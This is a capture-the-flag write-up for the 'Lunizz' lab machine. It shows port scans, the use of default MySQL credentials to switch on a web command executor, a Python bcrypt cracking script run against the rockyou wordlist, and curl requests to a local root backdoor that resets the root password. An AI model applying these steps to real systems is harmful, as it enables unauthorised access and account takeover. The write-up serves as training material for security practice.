## Lunizz CTF

# Enumeration
```
# Nmap 7.91 scan initiated Thu Mar  4 15:05:13 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,80,3306,4444,5000 10.10.187.91
Nmap scan report for 10.10.187.91
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-03-04 15:05:14 PST for 16s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQ6tpIF+vVAr4XW2jvHXaX311/qtXWgA/XJsPs4e1sAEDV9x9qQb6d6YTUECsJVg7r/HLuK4U3Bn5tco9Aa4cfij07qlbby08K8ByOrCFHeOJreYVqjsCBMdOo29GC83hOH8IzCo99pONcuviuPtRXion4PURNZPkdiMjhJv0ugruICXvqvNuXCtb7o4cF+OGNx7vGzllSrBJoNW6dA3+bhwE+ktZ14Ezbycb4CzbGoKXC+SKqt+82VrwpC4F9B3JPsSs6dkutSW1Zs0mtBYynv4dXzi3/dyY89jNedHOzwlIsOOTPfMhDQ9Qu6LpixmbpTTKnAlW+6gVAo21pwWlZ
|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBTbAWLeWIuaAVyErImxGlw4qYC6DkIkhWx6m84sgWaNBG5dhXu96NpywKz3Qr/lq2y53WN0RufLUlmQGhJ2QMA=
|   256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRqrXXIaHRlVe9pndYgXYOQLkggzjJoC6ZToAWWHeUH
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   syn-ack ttl 61 MySQL 5.7.32-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.32-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, LongPassword, FoundRows, ODBCClient, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x04\x7FW\x0B7\x1D-\x05mEL\x04Zjj\x18Qd~\x1D
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.32_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.32_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-12-10T19:29:01
| Not valid after:  2030-12-08T19:29:01
| MD5:   1dd1 d145 b3aa d2c4 6652 764c 0cbd 3bbd
| SHA-1: 183a eca2 02d3 982a 72a1 15d6 973b 6eb1 5cae 6e6c
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMyX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIwMTIxMDE5MjkwMVoXDTMwMTIwODE5MjkwMVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zMl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3dOQjVEiheXhdhZwnHxq4
| 9+mEE3PH4Qu6d9vDYjX08ZzIPRRC4uk70KVmd7LAjtgLIeuw0uNHFZGJ0tyGH05M
| FgBsbNpwBfKTiCaCdv+45sMcFAktoesNkhWxDJZfXm+j02kAq8FmKSG01q2b/EVR
| 21xmiyfAkGzUF00yFq+evPY38zDANHuXDL7ar4SVhzNcUcIWNbymVPz7ShTj1AKz
| NN2//xdKOTxwnOYTFVDDBZ9S+MwJXVlSbREg5iant1CldktC5C7olpGsIsyBJXDO
| O4fO0LaA0NLqkgggE2kH5WUhOJVeatSLnESa7inmiN3gs3YLEuNZDm4Q9SCul33r
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAGpSusxJ
| qpmorCaIM+ILbP/e9P2eC/p5JbtZtT6kOhrHSLO5JMalq4r2SYCIcYdWc53KbE4O
| yvl9sFLsL7J0gOkrjXJquyjzcQEpC8EbrWiYgLHCCZUCR1ATwT/ZT4b1fZz2Og38
| BdNLMlRV5KRRTfvvTvNkax7wmrbUjrnnuYOc4JJpMR1HMGk3ZDpgn/GP0oBAsJuS
| S0bMSkdBXDGof4NDbvMBKNfhmld7BAOKn1vFSvwzsyLQvaLdJ6UExHNgsIb3BOMv
| AbkjXHlx2ciuMYTPG/T3gkf503ZCkXHfyiibqptuoKH6BbNp+omKHcKBFqx+b7NS
| SUxy89TgA5jAO44=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
4444/tcp open  krb524? syn-ack ttl 61
| fingerprint-strings:
|   GetRequest:
|     Can you decode this for me?
|     ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
|     Wrong Password
|   NULL:
|     Can you decode this for me?
|     ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
|   SSLSessionReq:
|     Can you decode this for me?
|_    cmFuZG9tcGFzc3dvcmQ=
5000/tcp open  upnp?   syn-ack ttl 61
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, HTTPOptions, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, NULL, RPCCheck, RTSPRequest, SIPOptions, SSLSessionReq, X11Probe, ZendJavaBridge, afp, giop:
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4444-TCP:V=7.91%I=7%D=3/4%Time=604167B0%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3D,"Can\x20you\x20decode\x20this\x20for\x20me\?\nZXh0cmVtZWhhcmRyb290
SF:cGFzc3dvcmQ=\n")%r(GetRequest,4B,"Can\x20you\x20decode\x20this\x20for\x
SF:20me\?\nZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=\nWrong\x20Password")%r(SSLSess
SF:ionReq,31,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncmFuZG9tcGFzc3d
SF:vcmQ=\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.91%I=7%D=3/4%Time=604167AB%P=x86_64-pc-linux-gnu%r(NUL
SF:L,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x
SF:20/usr/local/ssl/openssl\.cnf")%r(GenericLines,46,"OpenSSH\x205\.1\nUna
SF:ble\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.
SF:cnf")%r(RTSPRequest,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config
SF:\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(DNSVersionBindReqTC
SF:P,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x
SF:20/usr/local/ssl/openssl\.cnf")%r(ZendJavaBridge,46,"OpenSSH\x205\.1\nU
SF:nable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl
SF:\.cnf")%r(HTTPOptions,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20conf
SF:ig\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(RPCCheck,46,"Open
SF:SSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/loc
SF:al/ssl/openssl\.cnf")%r(DNSStatusRequestTCP,46,"OpenSSH\x205\.1\nUnable
SF:\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf
SF:")%r(SSLSessionReq,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\
SF:x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(Kerberos,46,"OpenSSH
SF:\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/
SF:ssl/openssl\.cnf")%r(X11Probe,46,"OpenSSH\x205\.1\nUnable\x20to\x20load
SF:\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(LDAPBindR
SF:eq,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\
SF:x20/usr/local/ssl/openssl\.cnf")%r(SIPOptions,46,"OpenSSH\x205\.1\nUnab
SF:le\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.c
SF:nf")%r(LANDesk-RC,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x
SF:20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(JavaRMI,46,"OpenSSH\x
SF:205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ss
SF:l/openssl\.cnf")%r(afp,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20con
SF:fig\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(giop,46,"OpenSSH
SF:\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/
SF:ssl/openssl\.cnf");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  4 15:05:30 2021 -- 1 IP address (1 host up) scanned in 17.83 seconds
```

# Port 80 Enumeration
Start enumeration while moving on to other open ports, final results below
```
# gobuster dir -u http://10.10.187.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster/initial                                         
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.187.91
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2021/03/04 15:13:59 Starting gobuster
===============================================================
/index.php (Status: 200)
/instructions.txt (Status: 200)
/hidden (Status: 301)
/whatever (Status: 301)
```

# Port 4444
connecting to this port prompts to decode a base64 string including the following
```
echo "ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==" | base64 -d
extremesecurerootpassword

echo "ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=" | base64 -d
extremehardrootpassword

echo "cmFuZG9tcGFzc3dvcmQ=" | base64 -d
randompassword

echo "bGV0bWVpbg==" | base64 -d
letmein
```

Upon entering the correct answer it appears to provide a root shell that then gives a fatal error on any input, so this might just be a rabbit hole

Around this point our previous port 80 enumeration found instructions.txt so lets check that out

# instructions.txt
```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:redacted default pass)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```
Looks like we found the default password for the mysql user runcheck
Lets try and see if we can use this to connect since port 3306 for mysql is open

# mysql
```
# mysql -u runcheck -h 10.10.187.91 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
We can infact connect with these default credentials so lets explore

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+
2 rows in set (0.154 sec)

MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.153 sec)

MySQL [runornot]> select * from runcheck;
+------+
| db flag |
+------+
|    0 |
+------+
1 row in set (0.153 sec)

MySQL [runornot]>
```
Interesting, looks like the only thing here is a table with a run column set to 0.
Given the CTF flags it seems like this controls a command executor and that this column name is a flag, let go ahead and change this value to 1. 
```
MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.155 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> select * from runcheck;
+------+
| rdb flag  |
+------+
|    1 |
+------+
1 row in set (0.152 sec)

MySQL [runornot]>
```
Checking our enumeration we have found more directories, hidden and whatever so lets check these out

# Hidden
This seems like a way to upload images, initial attempts to upload a shell do not work so before we try and bypass any possible filters here lets checkout whatever for this command executor we have seemingly enabled.

# Whatever
Command Executer Mode :1

Command Executer

looks like we can execture commands for here and the command executor mode is set to 1, we can check that updating the run value, in the sql database changes this mode so with it set to 1 lets try and see what we can find
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

ls -la
drwxr-xr-x 2 root root 4096 Dec  7 17:32 .
drwxr-xr-x 4 root root 4096 Dec 10 19:44 ..
-rw-r--r-- 1 root root  269 Dec  7 17:01 config.php
-rw-r--r-- 1 root root  584 Dec  7 17:31 index.php

pwd
/var/www/html/whatever

given the hint for the next flag...
ls -la /
drwxr-xr-x  25 root root       4096 Dec 14 04:53 .
drwxr-xr-x  25 root root       4096 Dec 14 04:53 ..
drwxr-xr-x   2 root root       4096 Dec 10 19:05 bin
drwxr-xr-x   4 root root       4096 Dec 14 04:53 boot
drwxr-xr-x   2 root root       4096 Dec 10 18:55 cdrom
drwxr-xr-x  18 root root       3760 Mar  4 23:01 dev
drwxr-xr-x  96 root root       4096 Dec 16 05:02 etc
drwxr-xr-x   4 root root       4096 Dec 10 19:18 home
lrwxrwxrwx   1 root root         34 Dec 14 04:53 initrd.img -> boot/initrd.img-4.15.0-128-generic
lrwxrwxrwx   1 root root         34 Dec 10 18:59 initrd.img.old -> boot/initrd.img-4.15.0-124-generic
drwxr-xr-x  22 root root       4096 Dec 10 20:06 lib
drwxr-xr-x   2 root root       4096 Dec 10 20:05 lib64
drwx------   2 root root      16384 Dec 10 18:54 lost+found
drwxr-xr-x   2 root root       4096 Aug  6  2020 media
drwxr-xr-x   2 root root       4096 Aug  6  2020 mnt
drwxr-xr-x   2 root root       4096 Aug  6  2020 opt
dr-xr-xr-x 120 root root          0 Mar  4 23:01 proc
drwxr-xr-x   3 root root       4096 Dec 10 19:17 unusual directory
drwx------   6 root root       4096 Dec 10 19:58 root
drwxr-xr-x  27 root root        880 Mar  4 23:04 run
drwxr-xr-x   2 root root      12288 Dec 10 19:05 sbin
drwxr-xr-x   2 root root       4096 Dec 10 19:09 snap
drwxr-xr-x   2 root root       4096 Aug  6  2020 srv
-rw-------   1 root root 1923088384 Dec 10 18:59 swap.img
dr-xr-xr-x  13 root root          0 Mar  4 23:01 sys
drwxrwxrwt   2 root root       4096 Mar  4 23:28 tmp
drwxr-xr-x  10 root root       4096 Aug  6  2020 usr
drwxr-xr-x  14 root root       4096 Dec 10 19:19 var
lrwxrwxrwx   1 root root         31 Dec 14 04:53 vmlinuz -> boot/vmlinuz-4.15.0-128-generic
lrwxrwxrwx   1 root root         31 Dec 10 18:59 vmlinuz.old -> boot/vmlinuz-4.15.0-124-generic

We are looking for a folder that shouldn't be here so the only thing out of the ordinary is unusual directory
ls -la /
drwxr-xr-x  3 root root 4096 Dec 10 19:17 .
drwxr-xr-x 25 root root 4096 Dec 14 04:53 ..
drwxr-xr-x  2 root root 4096 Dec 10 19:26 pass

ls -la /unusual directory/pass
drwxr-xr-x 2 root root 4096 Dec 10 19:26 .
drwxr-xr-x 3 root root 4096 Dec 10 19:17 ..
-rw-r--r-- 1 adam adam  433 Dec  7 21:47 bcrypt_encryption.py

cat /unusual directory/pass/bcrypt_encryption.py

import base64

password = # https://www.youtube.com/watch?v=-tJYN-eG1zk&ab_channel=QueenOfficial
bpass = password.encode('ascii')
passed= str(base64.b64encode(bpass))
hashAndSalt = bcrypt.hashpw(passed.encode(), bcrypt.gensalt())
print(hashAndSalt)

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
# I wrote this code last year and i didnt save password verify line... I need to find my password
```

Interesting looks like a way to get a password for likely the user Adam given the file owner, and given the video its likely from the rockyou password list so lets modify this script to get the password

passDecode.py
```
import bcrypt
import base64

hashedPass = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'

file = open("/usr/share/wordlists/rockyou.txt","r")

for password in file:

	try:
		bpass = password.strip().encode('ascii','ignore')
		passed= str(base64.b64encode(bpass))
		hashAndSalt = bcrypt.hashpw(passed.encode(), salt)

		if hashAndSalt == hashedPass:
			print("Password match: ", password, hashAndSalt)
			break
	except:continue
```
Given this is bcrypt this is going to take some time...
Eventually we get a hit though, and we can use this to ssh as adam

# Adam
```
adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt
do you remember our place
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
```
The location in this link is the next flag and also the password for mason given the message, nocaps or spaces, so lets switch over to mason

# Mason/Privilege Escalation
We find the user flag in mason's home directory
After going through the usual privilege escalation routes, we find the following
```
mason@lunizz:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:mysql           0.0.0.0:*               LISTEN
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN
tcp        0    316 ip-10-10-130-226.eu:ssh ip-10-13-1-12.eu-:33234 ESTABLISHED
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
udp        0      0 localhost:domain        0.0.0.0:*
udp        0      0 ip-10-10-130-226:bootpc 0.0.0.0:*
raw6       0      0 [::]:ipv6-icmp          [::]:*                  7

```
let see what is running on 8080

```
mason@lunizz:~$ curl localhost:8080
**********************************************************
*        Mason's Root Backdoor                   *
*                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
so we can do the following

```
mason@lunizz:~$ curl localhost:8080 -X POST -d "password=[mason's password]&cmdtype=lsla"
total 44
drwx------  6 root root 4096 Dec 10 19:58 .
drwxr-xr-x 25 root root 4096 Dec 14 04:53 ..
lrwxrwxrwx  1 root root    9 Dec 10 19:53 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Dec 10 19:15 .bashrc
drwx------  3 root root 4096 Dec 10 20:13 .cache
drwx------  3 root root 4096 Dec 10 19:15 .gnupg
-rw-r--r--  1 root root  794 Dec  8 16:39 index.php
drwxr-xr-x  3 root root 4096 Dec 10 19:14 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   37 Dec  8 16:56 root.txt
-rw-r--r--  1 root root   66 Dec 10 19:35 .selected_editor
drwx------  2 root root 4096 Dec 10 19:09 .ssh
**********************************************************
*        Mason's Root Backdoor                   *
*                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
interesting, we don't want to reboot so lets try passwd
```
mason@lunizz:~$ curl localhost:8080 -X POST -d "password=[mason's password]&cmdtype=passwd"
<br>Password Changed To :[newpass]<br>**********************************************************
*        Mason's Root Backdoor                   *
*                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
presumably we just reset the root password so lets find out
```
mason@lunizz:~$ su -
Password:
root@lunizz:~#
```
We have root and can find the final flag in the root directory!
